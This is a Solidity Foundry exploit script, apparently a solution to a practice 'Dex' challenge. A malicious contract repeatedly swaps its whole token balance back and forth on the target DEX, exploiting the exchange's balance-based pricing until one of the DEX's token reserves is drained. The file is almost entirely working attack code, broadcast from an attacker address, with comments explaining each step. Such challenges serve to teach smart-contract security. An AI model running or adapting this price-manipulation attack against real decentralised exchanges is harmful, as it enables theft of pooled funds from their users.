// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script, console} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface IDex {
    function approve(address spender, uint256 amount) external;
    function swap(address from, address to, uint256 amount) external;

    function token1() external view returns(address);
    function token2() external view returns(address);
    function balanceOf(address token, address account) external view returns(uint256);
}

interface ISwappableToken {
    function approve(address owner, address spender, uint256 amount) external;
    function transferFrom(address _from, address _to, uint256 amount) external;

    function balanceOf(address account) external view returns(uint256);
}

contract DexAttackMaliciousContract is Constants {
    function attack(IDex victim) public {
        address token1 = victim.token1();
        address token2 = victim.token2();

        // first let's fund our malicious contract
        ISwappableToken token1ERC20 = ISwappableToken(token1);
        ISwappableToken token2ERC20 = ISwappableToken(token2);
        
        token1ERC20.approve(ATTACKER_ADDRESS, address(this), type(uint256).max);
        token2ERC20.approve(ATTACKER_ADDRESS, address(this), type(uint256).max);
        token1ERC20.transferFrom(ATTACKER_ADDRESS, address(this), token1ERC20.balanceOf(ATTACKER_ADDRESS));
        token2ERC20.transferFrom(ATTACKER_ADDRESS, address(this), token2ERC20.balanceOf(ATTACKER_ADDRESS));

        address _from = token1;
        address _to = token2;
        address _tmp;

        uint256 dexTokenFromBalance;
        uint256 dexTokenToBalance;
        uint256 attackerTokenFromBalance;

        uint256 swapAmount;

        // We allow the dex to spend any amount of tokens in our behalf.
        // We need this so that the dex can take our _from token before
        // giving us the _to token.
        victim.approve(address(victim), type(uint256).max);

        while(true) {
            dexTokenFromBalance = victim.balanceOf(_from, DEX_ADDRESS);
            dexTokenToBalance = victim.balanceOf(_to, DEX_ADDRESS);

            if (dexTokenFromBalance == 0 || dexTokenToBalance == 0) {
                break;
            }

            attackerTokenFromBalance = victim.balanceOf(_from, address(this));

            // The last time we swap we'll have more of tokenFrom than the dex, so we can
            // just send however much the dex holds to obtain its full balance of tokenFrom.
            swapAmount = attackerTokenFromBalance > dexTokenFromBalance ? dexTokenFromBalance : attackerTokenFromBalance;

            console.log("dex tokenFrom balance: ", dexTokenFromBalance);
            console.log("dex tokenTo balance: ", dexTokenToBalance);
            console.log("player tokenFrom balance: ", attackerTokenFromBalance);
            console.log("swap amount: ", swapAmount);

            victim.swap(_from, _to, swapAmount);
            
            // Prepare to swap the other way around next time
            _tmp = _to;
            _to = _from;
            _from = _tmp;            
        }
    }
}

contract DexAttacker is Constants, Script {

    function run() public {
        IDex victim = IDex(DEX_ADDRESS);

        vm.startBroadcast(ATTACKER_ADDRESS);
        attack(victim);
        vm.stopBroadcast();
    }

    function attack(IDex victim) private {
        DexAttackMaliciousContract _attacker = new DexAttackMaliciousContract();
        _attacker.attack(victim);
    }
}
